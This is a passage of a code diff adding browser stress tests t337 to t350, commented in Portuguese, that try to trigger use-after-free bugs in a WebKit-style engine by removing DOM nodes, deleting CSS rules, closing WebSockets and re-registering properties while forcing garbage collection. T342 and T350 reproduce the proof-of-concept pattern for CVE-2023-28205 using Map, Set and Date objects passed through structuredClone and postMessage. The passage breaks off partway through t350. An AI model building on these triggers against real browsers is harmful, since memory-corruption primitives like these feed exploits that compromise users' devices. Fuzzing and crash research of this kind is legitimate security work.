+      el.style.fontFamily = '"SheetFont", sans-serif';
+      el.textContent = 'using_sheet_font';
+      document.body.appendChild(el);
+      let _ = el.offsetWidth; // força carregamento da fonte
+      gc();
+
+      // Deletar a @font-face rule enquanto o elemento a usa
+      if(sheet && sheet.cssRules.length > 0){
+        const rule = sheet.cssRules[0];
+        sheet.deleteRule(0);
+        gc(); // GC: CachedFont pode ser liberado
+        _ = el.offsetWidth; // re-render sem a fonte
+        try { rule.cssText; } catch(e){} // stale ptr
+      }
+
+      document.body.removeChild(el);
+      document.head.removeChild(style);
+    } catch(e){}
+  } catch(e){}
+  log('Teste 337: fim');
+}
+
+// ─── T338 ─────────────────────────────────────────────────────────────────────
+// Drag and Drop API: dragstart/dragover/drop + DOM removal durante drag + GC
+// O DragController mantém uma referência ao drag source; remover o elemento
+// durante o drag pode causar UAF no DragController.
+function t338(){
+  log('Teste 338: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    // Criar elementos draggable
+    const dragEls = [];
+    for(let i = 0; i < 10; i++){
+      const el = document.createElement('div');
+      el.draggable = true;
+      el.style.cssText = 'width:60px;height:60px;background:hsl(' + (i*36) + ',60%,50%);display:inline-block;cursor:grab;';
+      el.textContent = 'drag_' + i;
+      area.appendChild(el);
+      dragEls.push(el);
+    }
+
+    // Drop zone
+    const dropZone = document.createElement('div');
+    dropZone.style.cssText = 'width:300px;height:100px;background:#eee;border:2px dashed #999;margin-top:10px;';
+    dropZone.textContent = 'Drop Zone';
+    area.appendChild(dropZone);
+
+    // Handlers de drag
+    let dragN = 0;
+    for(let el of dragEls){
+      el.addEventListener('dragstart', function(evt){
+        dragN++;
+        gc(); // GC durante dragstart — DragController pode ter stale ptr
+        try { evt.dataTransfer.setData('text/plain', 'drag_data_' + dragN); } catch(e){}
+        // Remover o próprio elemento durante dragstart
+        if(dragN === 3 && el.parentNode){
+          area.removeChild(el);
+          gc(); // GC: DragController tem stale ptr para o drag source
+          area.appendChild(el);
+        }
+      });
+
+      el.addEventListener('dragend', function(evt){
+        gc();
+        // Verificar estado após drag
+        try { evt.dataTransfer; }  catch(e){}
+        try { evt.target; }        catch(e){}
+      });
+    }
+
+    dropZone.addEventListener('dragover', function(evt){
+      try { evt.preventDefault(); } catch(e){}
+      gc(); // GC durante dragover
+    });
+
+    dropZone.addEventListener('drop', function(evt){
+      try { evt.preventDefault(); } catch(e){}
+      gc();
+      try {
+        const data = evt.dataTransfer.getData('text/plain');
+        // Remover drop zone durante drop event
+        if(dropZone.parentNode){ area.removeChild(dropZone); gc(); area.appendChild(dropZone); }
+      } catch(e){}
+    });
+
+    // Simular eventos de drag via dispatchEvent
+    for(let el of dragEls.slice(0, 5)){
+      try {
+        el.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true, dataTransfer: new DataTransfer() }));
+        gc();
+        dropZone.dispatchEvent(new DragEvent('dragover', { bubbles: true, cancelable: true }));
+        gc();
+        dropZone.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true }));
+        gc();
+        el.dispatchEvent(new DragEvent('dragend', { bubbles: true }));
+        gc();
+      } catch(e){}
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 338: fim');
+}
+
+// ─── T339 ─────────────────────────────────────────────────────────────────────
+// Pointer Events API: pointerdown + removeChild durante evento + GC
+// PointerCapture mantém referência ao elemento capturado; remover o elemento
+// durante um pointer event pode causar UAF no PointerCapture.
+function t339(){
+  log('Teste 339: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    const pointerEls = [];
+    for(let i = 0; i < 10; i++){
+      const el = document.createElement('div');
+      el.style.cssText = 'width:80px;height:80px;background:hsl(' + (i*36) + ',50%,50%);display:inline-block;touch-action:none;';
+      el.textContent = 'ptr_' + i;
+      area.appendChild(el);
+      pointerEls.push(el);
+    }
+
+    let ptrN = 0;
+    for(let el of pointerEls){
+      el.addEventListener('pointerdown', function(evt){
+        ptrN++;
+        gc(); // GC durante pointerdown
+
+        // Tentar capturar o pointer
+        try { el.setPointerCapture(evt.pointerId); gc(); } catch(e){}
+
+        // Remover elemento durante pointerdown
+        if(ptrN === 3 && el.parentNode){
+          area.removeChild(el);
+          gc(); // GC: PointerCapture tem stale ptr
+          area.appendChild(el);
+        }
+      });
+
+      el.addEventListener('pointermove', function(evt){
+        gc();
+        try { el.releasePointerCapture(evt.pointerId); gc(); } catch(e){}
+      });
+
+      el.addEventListener('pointerup', function(evt){
+        gc();
+        try { el.hasPointerCapture(evt.pointerId); } catch(e){}
+      });
+
+      el.addEventListener('lostpointercapture', function(evt){
+        gc();
+        if(el.parentNode){ area.removeChild(el); gc(); area.appendChild(el); }
+      });
+    }
+
+    // Disparar eventos pointer sintéticos
+    for(let el of pointerEls){
+      for(let evtType of ['pointerdown', 'pointermove', 'pointerup']){
+        try {
+          el.dispatchEvent(new PointerEvent(evtType, {
+            bubbles: true, cancelable: true,
+            pointerId: 1, pointerType: 'mouse',
+            clientX: 10, clientY: 10
+          }));
+          gc();
+        } catch(e){}
+      }
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 339: fim');
+}
+
+// ─── T340 ─────────────────────────────────────────────────────────────────────
+// CSS @keyframes name collision + GC (StyleResolver AnimationData UAF)
+// Redefinir @keyframes com o mesmo nome enquanto uma animação está rodando
+// pode causar UAF no AnimationData que referencia os keyframes.
+function t340(){
+  log('Teste 340: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    const style340 = document.createElement('style');
+    style340.textContent = `
+      @keyframes collidingAnim {
+        0%   { transform: translateX(0px); opacity: 1; }
+        100% { transform: translateX(100px); opacity: 0; }
+      }
+      .kf-animated {
+        animation: collidingAnim 0.1s linear infinite;
+        width: 40px; height: 40px; background: red; display: inline-block;
+      }
+    `;
+    document.head.appendChild(style340);
+
+    // Criar elementos animados
+    const animEls = [];
+    for(let i = 0; i < 15; i++){
+      const el = document.createElement('div');
+      el.className = 'kf-animated';
+      area.appendChild(el);
+      animEls.push(el);
+    }
+
+    let _ = area.offsetHeight;
+    gc();
+
+    // Redefinir @keyframes com o mesmo nome "collidingAnim" em loop
+    const sheet340 = style340.sheet;
+    for(let iter = 0; iter < 20; iter++){
+      try {
+        // Inserir nova @keyframes com mesmo nome (colide com a existente)
+        const newRule = '@keyframes collidingAnim { ' +
+          '0% { transform: rotate(' + (iter * 10) + 'deg); } ' +
+          '50% { transform: scale(' + (1 + iter * 0.1) + '); } ' +
+          '100% { transform: translateY(' + (iter * 5) + 'px); } }';
+        try { sheet340.insertRule(newRule, 0); } catch(e){}
+        gc(); // GC: AnimationData pode ter stale ptr para keyframes antigos
+
+        _ = area.offsetHeight; // forçar re-resolução das animações
+
+        // Remover a nova regra (não a original)
+        if(sheet340 && sheet340.cssRules.length > 1){
+          try {
+            const rule = sheet340.cssRules[0];
+            sheet340.deleteRule(0);
+            gc();
+            rule.cssText; // stale ptr
+          } catch(e){}
+        }
+      } catch(e){}
+    }
+
+    // Remover elementos com animação ativa + GC
+    for(let el of animEls){
+      try {
+        area.removeChild(el);
+        gc();
+        el.style.animationName; // pós-remoção
+      } catch(e){}
+    }
+
+    try { document.head.removeChild(style340); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 340: fim');
+}
+
+// ─── T341 ─────────────────────────────────────────────────────────────────────
+// WebSocket: close() durante message handler + GC (WebSocketChannel UAF)
+// WebSocketChannel é alocado em fastMalloc; fechar durante onmessage
+// pode causar UAF no WebSocketChannel enquanto processa a mensagem.
+function t341(){
+  log('Teste 341: inicio');
+  try {
+    // Testar com URLs que falham rapidamente (sem servidor)
+    const wsURLs = [
+      'ws://localhost:19999/test',    // porta improvável de existir
+      'wss://localhost:19998/test',
+      'ws://127.0.0.1:19997/test',
+    ];
+
+    for(let url of wsURLs){
+      try {
+        const ws = new WebSocket(url);
+
+        ws.onopen = function(){
+          gc(); // GC quando conexão abre
+          // Enviar mensagens e fechar simultaneamente
+          try { ws.send('hello_' + Date.now()); } catch(e){}
+          try { ws.send(new ArrayBuffer(64)); }    catch(e){}
+          gc();
+          ws.close(1000, 'normal_close');
+          gc(); // GC: WebSocketChannel pode estar sendo destruído
+          // Acessar pós-close
+          try { ws.readyState; }    catch(e){}
+          try { ws.bufferedAmount; } catch(e){}
+        };
+
+        ws.onmessage = function(evt){
+          gc(); // GC durante onmessage
+          ws.close(); // fechar durante onmessage — UAF
+          gc();
+          try { evt.data; }          catch(e){}
+          try { ws.readyState; }     catch(e){}
+        };
+
+        ws.onerror = function(err){
+          gc(); // GC durante onerror (conexão recusada)
+          try { ws.readyState; }     catch(e){}
+          // Tentar fechar um WebSocket já em erro
+          try { ws.close(); gc(); }  catch(e){}
+        };
+
+        ws.onclose = function(evt){
+          gc();
+          try { evt.code; evt.reason; evt.wasClean; } catch(e){}
+          // Acessar ws após close
+          try { ws.send('post_close'); }    catch(e){}
+          try { ws.bufferedAmount; }        catch(e){}
+        };
+
+        gc();
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 341: fim');
+}
+
+// ─── T342 ─────────────────────────────────────────────────────────────────────
+// structuredClone profundo: Map<Map<Set<Date>>> + GC delay (CVE-2023-28205 variant)
+// Aninhamento de Map→Map→Set→Date: cada nível adiciona um objeto em
+// mapStack/setStack antes de ser registrado como GC root. Profundidade 5
+// coloca 5 Maps, 5 Sets e múltiplas Dates em stacks não-escaneadas pelo GC.
+function t342(){
+  log('Teste 342: inicio');
+  try {
+    // Construir hierarquia profunda explícita
+    const dates342 = Array.from({ length: 20 }, function(_, i){
+      const d = new Date(i * 86400000);
+      d[0] = i * 1.1; // butterfly no Date (exato do PoC CVE-2023-28205)
+      return d;
+    });
+
+    // Map→Map→Set→Date (5 níveis)
+    const level5Set = new Set(dates342);
+    const level4Map = new Map([
+      ['dates', level5Set],
+      ['direct_date', dates342[0]],
+      ['arr', new Array(20).fill(1.5)]
+    ]);
+    const level3Set = new Set([level4Map, dates342[1], dates342[2]]);
+    const level2Map = new Map([
+      ['inner', level3Set],
+      ['date', dates342[3]],
+      ['level4', level4Map]
+    ]);
+    const level1Set = new Set([level2Map, level4Map, dates342[4]]);
+    const rootMap   = new Map([
+      ['l1_set', level1Set],
+      ['l2_map', level2Map],
+      ['dates', new Set(dates342)],
+    ]);
+
+    // structuredClone com GC entre operações
+    for(let i = 0; i < 15; i++){
+      try {
+        // Soltar referência DURANTE o clone para abrir janela de UAF
+        // (structuredClone é síncrono, mas GC pode ser disparado por pressão de memória)
+        const gcBefore = function(){
+          for(let j = 0; j < 8; j++) new ArrayBuffer(0x800000); // 64MB total = força GC
+        };
+
+        gcBefore(); // forçar GC antes do clone
+        const cloned = structuredClone(rootMap);
+        gcBefore(); // GC durante uso do clone
+
+        // Verificar que o clone não foi corrompido
+        try {
+          const cs = cloned.get('l1_set');
+          if(cs) cs.size;
+        } catch(e){}
+        try {
+          const cm = cloned.get('l2_map');
+          if(cm) cm.size;
+        } catch(e){}
+      } catch(e){}
+    }
+
+    // postMessage com a mesma estrutura (via MessageChannel)
+    try {
+      const mc342 = new MessageChannel();
+      mc342.port1.onmessage = function(evt){
+        gc(); // GC após deserialização completa
+        const data = evt.data;
+        if(data){
+          try { data.get('l1_set').size; } catch(e){}
+          try { data.get('l2_map').size; } catch(e){}
+        }
+      };
+      for(let i = 0; i < 10; i++){
+        try { mc342.port2.postMessage(rootMap); gc(); } catch(e){}
+      }
+    } catch(e){}
+  } catch(e){}
+  log('Teste 342: fim');
+}
+
+// ─── T343 ─────────────────────────────────────────────────────────────────────
+// CSS @property + CSS.registerProperty + GC (CSS Houdini UAF)
+// CSS.registerProperty cria um CSSCustomPropertySyntax em fastMalloc;
+// GC durante a avaliação de uma propriedade registrada pode causar UAF.
+function t343(){
+  log('Teste 343: inicio');
+  try {
+    if(typeof CSS === 'undefined' || typeof CSS.registerProperty !== 'function'){
+      log('Teste 343: fim (sem CSS.registerProperty)');
+      return;
+    }
+
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    // Registrar múltiplas @property
+    const properties = [
+      { name: '--t343-color',    syntax: '<color>',       initialValue: 'red',   inherits: true  },
+      { name: '--t343-length',   syntax: '<length>',      initialValue: '0px',   inherits: false },
+      { name: '--t343-number',   syntax: '<number>',      initialValue: '0',     inherits: true  },
+      { name: '--t343-pct',      syntax: '<percentage>',  initialValue: '0%',    inherits: false },
+      { name: '--t343-integer',  syntax: '<integer>',     initialValue: '0',     inherits: false },
+      { name: '--t343-angle',    syntax: '<angle>',       initialValue: '0deg',  inherits: false },
+      { name: '--t343-time',     syntax: '<time>',        initialValue: '0s',    inherits: false },
+      { name: '--t343-url',      syntax: '<url>',         initialValue: 'url("")', inherits: false },
+      { name: '--t343-any',      syntax: '*',             initialValue: 'any',   inherits: true  },
+    ];
+
+    for(let prop of properties){
+      try { CSS.registerProperty(prop); } catch(e){}
+    }
+    gc();
+
+    // Criar elementos usando as propriedades registradas
+    const style = document.createElement('style');
+    style.textContent = `
+      #dom14 .t343-target {
+        --t343-color: blue;
+        --t343-length: 50px;
+        --t343-number: 42;
+        --t343-pct: 75%;
+        width:  var(--t343-length);
+        height: calc(var(--t343-number) * 1px);
+        opacity: calc(var(--t343-pct) / 100%);
+        background-color: var(--t343-color);
+      }
+    `;
+    document.head.appendChild(style);
+
+    const testEls = [];
+    for(let i = 0; i < 20; i++){
+      const el = document.createElement('div');
+      el.className = 't343-target';
+      el.style.setProperty('--t343-color', 'hsl(' + (i*18) + ',70%,50%)');
+      el.style.setProperty('--t343-length', (10 + i*5) + 'px');
+      area.appendChild(el);
+      testEls.push(el);
+    }
+
+    let _ = area.offsetHeight;
+    gc();
+
+    // Mudar propriedades registradas em loop + GC
+    for(let iter = 0; iter < 20; iter++){
+      for(let el of testEls){
+        try {
+          el.style.setProperty('--t343-color', 'hsl(' + (iter * 15) + ',80%,40%)');
+          el.style.setProperty('--t343-length', (5 + iter * 3) + 'px');
+          el.style.setProperty('--t343-number', String(iter * 2));
+          gc();
+          _ = area.offsetHeight;
+          // Remover elemento durante recalculo da propriedade
+          if(iter === 10 && el.parentNode){
+            area.removeChild(el);
+            gc();
+            area.appendChild(el);
+          }
+        } catch(e){}
+      }
+    }
+
+    try { document.head.removeChild(style); } catch(e){}
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 343: fim');
+}
+
+// ─── T344 ─────────────────────────────────────────────────────────────────────
+// <datalist> + input[list] + DOM mutation + GC (DataListSuggestionPicker UAF)
+// DataList mantém uma referência ao input que o usa; remover o datalist ou
+// o input durante a interação pode causar UAF no DataListSuggestionPicker.
+function t344(){
+  log('Teste 344: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    // Criar datalists e inputs associados
+    const datalists = [];
+    const inputs344 = [];
+
+    for(let i = 0; i < 5; i++){
+      const dl = document.createElement('datalist');
+      dl.id = 'datalist14_' + i;
+      for(let j = 0; j < 20; j++){
+        const opt = document.createElement('option');
+        opt.value = 'suggestion_' + i + '_' + j;
+        dl.appendChild(opt);
+      }
+      area.appendChild(dl);
+      datalists.push(dl);
+
+      const inp = document.createElement('input');
+      inp.type = 'text';
+      inp.list = 'datalist14_' + i;
+      inp.id   = 'dl_input_' + i;
+      area.appendChild(inp);
+      inputs344.push(inp);
+    }
+
+    let _ = area.offsetHeight;
+    gc();
+
+    // Mutar datalist enquanto input está focado + GC
+    for(let round = 0; round < 15; round++){
+      const idx = round % datalists.length;
+      try {
+        const dl  = datalists[idx];
+        const inp = inputs344[idx];
+
+        try { inp.focus(); } catch(e){}
+        gc();
+
+        // Adicionar/remover opções do datalist enquanto focado
+        const newOpt = document.createElement('option');
+        newOpt.value = 'dynamic_' + round;
+        dl.appendChild(newOpt);
+        gc();
+        dl.removeChild(newOpt);
+        gc();
+
+        // Remover o datalist inteiro enquanto o input está associado
+        if(dl.parentNode){
+          area.removeChild(dl);
+          gc(); // GC: DataListSuggestionPicker pode ter stale ptr
+          inp.value = 'trigger_suggestion_' + round;
+          gc();
+          area.appendChild(dl);
+        }
+
+        try { inp.blur(); } catch(e){}
+        gc();
+      } catch(e){}
+    }
+
+    // Mudar o atributo list do input para um datalist inexistente
+    for(let inp of inputs344){
+      try {
+        inp.setAttribute('list', 'nonexistent_datalist_14');
+        gc();
+        inp.setAttribute('list', '');
+        gc();
+        inp.removeAttribute('list');
+        gc();
+      } catch(e){}
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 344: fim');
+}
+
+// ─── T345 ─────────────────────────────────────────────────────────────────────
+// iframe srcdoc + parent DOM mutation + GC (HTMLDocument re-entrance UAF)
+// iframe srcdoc cria um sub-documento; modificar o parent enquanto o srcdoc
+// está sendo parsed pode causar UAF no HTMLDocument.
+function t345(){
+  log('Teste 345: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    for(let i = 0; i < 5; i++){
+      try {
+        const iframe = document.createElement('iframe');
+        // srcdoc com conteúdo complexo que força parse longo
+        iframe.srcdoc = '<!DOCTYPE html><html><body>' +
+          '<div>' + '<p>content</p>'.repeat(200) + '</div>' +
+          '<script>document.body.style.background="red";<\/script>' +
+          '</body></html>';
+        area.appendChild(iframe);
+
+        // GC logo após inserção (srcdoc ainda sendo parsed)
+        gc();
+
+        // Mutar parent enquanto srcdoc está sendo parsed
+        const dummy = document.createElement('div');
+        dummy.textContent = 'parent_mutation_' + i;
+        area.insertBefore(dummy, iframe);
+        gc();
+        area.removeChild(dummy);
+        gc();
+
+        // Remover o próprio iframe durante o parse
+        if(iframe.parentNode){
+          area.removeChild(iframe);
+          gc(); // GC: HTMLDocument do srcdoc pode ter stale ptr para o parent
+          // Tentar acessar o iframe após remoção
+          try { iframe.contentDocument; } catch(e){}
+          try { iframe.contentWindow; }   catch(e){}
+        }
+        gc();
+      } catch(e){}
+    }
+
+    // srcdoc com JavaScript que muta o parent
+    try {
+      const iframe2 = document.createElement('iframe');
+      iframe2.srcdoc = '<html><body><script>try{ parent.document.getElementById("dom14").style.background="blue"; }catch(e){}<\/script></body></html>';
+      area.appendChild(iframe2);
+      gc();
+      setTimeout(function(){
+        try { if(iframe2.parentNode) area.removeChild(iframe2); } catch(e){}
+        gc();
+      }, 500);
+    } catch(e){}
+
+    setTimeout(function(){
+      while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+      area.style.display = 'none';
+    }, 1000);
+  } catch(e){}
+  log('Teste 345: fim');
+}
+
+// ─── T346 ─────────────────────────────────────────────────────────────────────
+// HTMLMediaElement.captureStream() + canvas + GC (MediaStream UAF)
+// captureStream() cria um MediaStream que captura frames do canvas/video;
+// GC durante a captura pode liberar o MediaStream antes do handler processar.
+function t346(){
+  log('Teste 346: inicio');
+  try {
+    if(typeof HTMLCanvasElement.prototype.captureStream !== 'function'){
+      log('Teste 346: fim (sem captureStream)');
+      return;
+    }
+
+    const canvas346 = document.getElementById('canvas14');
+    canvas346.style.display = 'block';
+    const ctx = canvas346.getContext('2d');
+    if(!ctx){ log('Teste 346: fim (sem canvas ctx)'); return; }
+
+    // Desenhar algo no canvas
+    ctx.fillStyle = 'red';
+    ctx.fillRect(0, 0, 64, 64);
+
+    // captureStream com diferentes frameRates
+    const streams = [];
+    for(let fps of [0, 1, 5, 10, 30, 60]){
+      try {
+        const stream = canvas346.captureStream(fps);
+        streams.push(stream);
+        gc(); // GC com stream ativo
+      } catch(e){}
+    }
+
+    gc(); // GC com todos os streams
+
+    // Mutar o canvas enquanto streams estão ativos
+    for(let iter = 0; iter < 10; iter++){
+      try {
+        ctx.fillStyle = 'hsl(' + (iter*36) + ',70%,50%)';
+        ctx.fillRect(0, 0, 64, 64);
+        gc(); // GC durante captura de frame
+      } catch(e){}
+    }
+
+    // Parar tracks dos streams + GC
+    for(let stream of streams){
+      try {
+        for(let track of stream.getTracks()){
+          track.stop();
+          gc(); // GC durante stop — MediaStreamTrack pode ter stale ptr
+          try { track.readyState; }  catch(e){}
+          try { track.kind; }        catch(e){}
+          try { track.id; }          catch(e){}
+        }
+      } catch(e){}
+    }
+
+    // Liberar streams + GC
+    streams.length = 0;
+    gcHeavy();
+
+    canvas346.style.display = 'none';
+  } catch(e){}
+  log('Teste 346: fim');
+}
+
+// ─── T347 ─────────────────────────────────────────────────────────────────────
+// Proxy + Object.defineProperty getter + GC (LLInt property access UAF)
+// Object.defineProperty com getter que faz GC; o LLInt acessa a propriedade
+// via get_by_id; o getter é chamado no C++ e faz GC → o objeto pode ser liberado.
+function t347(){
+  log('Teste 347: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    // Objeto com getter que faz GC ao ser acessado
+    function makeGCObject(val, name){
+      const obj = { _data: new Uint8Array(512), _val: val, _name: name };
+      Object.defineProperty(obj, 'value', {
+        get: function(){
+          gc(); // GC durante o getter
+          return this._val;
+        },
+        set: function(v){
+          gc(); // GC durante o setter
+          this._val = v;
+        },
+        enumerable: true, configurable: true
+      });
+      Object.defineProperty(obj, 'computed', {
+        get: function(){
+          gcHeavy(); // GC pesado durante getter de computed
+          return this._val * 2;
+        },
+        enumerable: true, configurable: true
+      });
+      return obj;
+    }
+
+    const gcObjs = Array.from({ length: 50 }, function(_, i){ return makeGCObject(i * 1.1, 'obj_' + i); });
+
+    // Acessar propriedades com getters que fazem GC
+    for(let i = 0; i < 30; i++){
+      try {
+        const obj = gcObjs[i % gcObjs.length];
+        let v = obj.value;     // triggera gc()
+        let c = obj.computed;  // triggera gcHeavy()
+        obj.value = v + 1;     // triggera gc() no setter
+        gc();
+      } catch(e){}
+    }
+
+    // Usar esses objetos em operações nativas (Object.keys, JSON.stringify, etc.)
+    for(let obj of gcObjs.slice(0, 10)){
+      try { Object.keys(obj); }         catch(e){}
+      try { Object.values(obj); }       catch(e){}
+      try { JSON.stringify(obj); }      catch(e){}
+      try { Object.assign({}, obj); }   catch(e){}
+      try { ({ ...obj }); }             catch(e){}
+    }
+
+    // Proxy com defineProperty handler que faz GC
+    const proxyTarget347 = {};
+    const proxy347 = new Proxy(proxyTarget347, {
+      defineProperty: function(t, k, desc){
+        gc();
+        return Reflect.defineProperty(t, k, desc);
+      },
+      getOwnPropertyDescriptor: function(t, k){
+        gc();
+        return Reflect.getOwnPropertyDescriptor(t, k);
+      },
+      set: function(t, k, v){
+        gc();
+        return Reflect.set(t, k, v);
+      },
+      get: function(t, k){
+        gc();
+        return Reflect.get(t, k);
+      }
+    });
+
+    for(let i = 0; i < 30; i++){
+      try {
+        proxy347['key_' + i] = i * 1.1;
+        proxy347['key_' + i];
+        Object.defineProperty(proxy347, 'def_' + i, { value: i, enumerable: true, configurable: true });
+        gc();
+      } catch(e){}
+    }
+
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 347: fim');
+}
+
+// ─── T348 ─────────────────────────────────────────────────────────────────────
+// HTMLOutputElement: form association + DOM removal + GC
+// <output> é um form-associated element; remover o form ou o output durante
+// eventos pode causar UAF no FormAssociatedElement.
+function t348(){
+  log('Teste 348: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    for(let i = 0; i < 10; i++){
+      try {
+        const form = document.createElement('form');
+        form.id = 'outputForm_' + i;
+
+        // inputs associados ao form
+        const inp1 = document.createElement('input');
+        inp1.type = 'range'; inp1.id = 'oi1_' + i; inp1.name = 'input1';
+        inp1.min = '0'; inp1.max = '100'; inp1.value = String(i * 10);
+        form.appendChild(inp1);
+
+        const inp2 = document.createElement('input');
+        inp2.type = 'number'; inp2.id = 'oi2_' + i; inp2.name = 'input2';
+        inp2.value = String(i * 5);
+        form.appendChild(inp2);
+
+        // <output> associado a ambos os inputs via atributo 'for'
+        const out = document.createElement('output');
+        out.name    = 'result_' + i;
+        out.htmlFor.add('oi1_' + i);
+        out.htmlFor.add('oi2_' + i);
+        out.form;
+        out.textContent = String(i * 15);
+        form.appendChild(out);
+
+        area.appendChild(form);
+
+        gc(); // GC com associação ativa
+
+        // Mutar form enquanto <output> está associado
+        form.removeChild(inp1);
+        gc(); // GC: HTMLOutputElement pode ter stale ptr para inp1
+        try { out.htmlFor; out.value; out.defaultValue; } catch(e){}
+
+        // Remover o form inteiro (com output associado)
+        area.removeChild(form);
+        gc(); // GC: FormAssociatedElement liberado
+        try { out.form; out.labels; out.name; } catch(e){} // pós-remoção
+
+        // Tentar usar o output sem form
+        try { out.value = 'post_removal_' + i; } catch(e){}
+        gc();
+      } catch(e){}
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 348: fim');
+}
+
+// ─── T349 ─────────────────────────────────────────────────────────────────────
+// CSS mask-image + element removal + GC (MaskImageOperation UAF)
+// mask-image cria uma MaskImageOperation similar ao clip-path;
+// remover o elemento enquanto o mask está sendo renderizado pode causar UAF.
+function t349(){
+  log('Teste 349: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    const style349 = document.createElement('style');
+    style349.textContent = `
+      .masked {
+        width: 80px; height: 80px; background: red;
+        display: inline-block;
+        mask-image: radial-gradient(circle, black 50%, transparent 50%);
+        -webkit-mask-image: radial-gradient(circle, black 50%, transparent 50%);
+      }
+      .masked-linear {
+        mask-image: linear-gradient(to right, black, transparent);
+        -webkit-mask-image: linear-gradient(to right, black, transparent);
+      }
+      .masked-url {
+        mask-image: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><circle cx='50' cy='50' r='40'/></svg>");
+        -webkit-mask-image: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><circle cx='50' cy='50' r='40'/></svg>");
+      }
+    `;
+    document.head.appendChild(style349);
+
+    const maskEls = [];
+    const maskClasses = ['masked', 'masked-linear', 'masked-url'];
+    for(let i = 0; i < 15; i++){
+      const el = document.createElement('div');
+      el.className = maskClasses[i % maskClasses.length];
+      el.textContent = 'mask_' + i;
+      area.appendChild(el);
+      maskEls.push(el);
+    }
+
+    let _ = area.offsetHeight;
+    gc();
+
+    // Mudar mask-image em loop + remoção + GC
+    const maskImages = [
+      'radial-gradient(circle, black 50%, transparent 50%)',
+      'linear-gradient(45deg, black, transparent)',
+      'none',
+      'radial-gradient(ellipse, black 30%, transparent 70%)',
+      'conic-gradient(from 0deg, black, transparent)',
+    ];
+
+    for(let iter = 0; iter < 20; iter++){
+      for(let el of maskEls){
+        try {
+          const maskImg = maskImages[iter % maskImages.length];
+          el.style.maskImage = maskImg;
+          el.style.webkitMaskImage = maskImg;
+          gc();
+          _ = area.offsetHeight;
+          // Remover durante renderização do mask
+          if(iter === 10 && el.parentNode){
+            area.removeChild(el);
+            gc(); // GC: MaskImageOperation tem stale ptr
+            area.appendChild(el);
+          }
+        } catch(e){}
+      }
+    }
+
+    // Remover todos + GC + acessar estilos de mask
+    for(let el of maskEls){
+      try {
+        area.removeChild(el);
+        gc();
+        el.style.maskImage;
+        el.style.webkitMaskImage;
+      } catch(e){}
+    }
+
+    try { document.head.removeChild(style349); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 349: fim');
+}
+
+// ─── T350 ─────────────────────────────────────────────────────────────────────
+// STRESS FINAL T350: CVE-2023-28205 + input.type UAF + Function.__defineGetter__ + rAF
+// Os 4 vetores mais específicos desta rodada em sequência rápida
+function t350(){
+  log('Teste 350: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    // === FASE 1: CVE-2023-28205 (Map+Date structuredClone + GC) ===
+    try {
+      const mc350 = new MessageChannel();
+      mc350.port1.onmessage = function(evt){
+        gc();
+        if(evt.data){
+          try { evt.data.m && evt.data.m.size; } catch(e){}
+          try { evt.data.s && evt.data.s.size; } catch(e){}
+          try { evt.data.d && evt.data.d.getTime(); } catch(e){}
+        }
+        gcHeavy();
+      };
+      const m350 = new Map([['k', 1], ['d', new Date(1111)], ['s', new Set([1,2,3])]]);
+      const d350 = new Date(1111); d350[0] = 1.1;
+      for(let i = 0; i < 15; i++){
+        try { mc350.port2.postMessage({ m: m350, s: new Set([d350, m350]), d: d350 }); gc(); } catch(e){}
+      }
+      gcHeavy();
+    } catch(e){}
+
+    // === FASE 2: input.type change UAF ===
+    try {
+      const inp350 = document.createElement('input');
+      inp350.type = 'search'; inp350.value = 'test'; area.appendChild(inp350);
+      const transitions = [['search','text'],['text','number'],['number','email'],['email','password'],['password','search']];
+      for(let [from, to] of transitions){
+        try {
+          inp350.type = from; try { inp350.focus(); } catch(e){}
+          gc();
+          inp350.type = to; // UAF: InputType antigo liberado com Timer na fila
+          gc();
+          try { inp350.validity.valid; } catch(e){}
+          try { inp350.blur(); } catch(e){}
+          gc();
+        } catch(e){}
+      }
+      if(inp350.parentNode) area.removeChild(inp350);
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 3: Function.__defineGetter__ em prototype ===
+    try {
+      for(let i = 0; i < 20; i++){
+        try {
+          function F350(){ this.v = i; }
+          try { F350.__defineGetter__('prototype', function(){ gc(); return { v: i * 2 }; }); } catch(e){}
+          try { F350.prototype.x = i; } catch(e){}
+          try { new F350(); } catch(e){}
+          gc();
+        } catch(e){}
+      }
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 4: requestAnimationFrame + DOM mutation ===
+    try {
+      const layerEl = document.createElement('div');
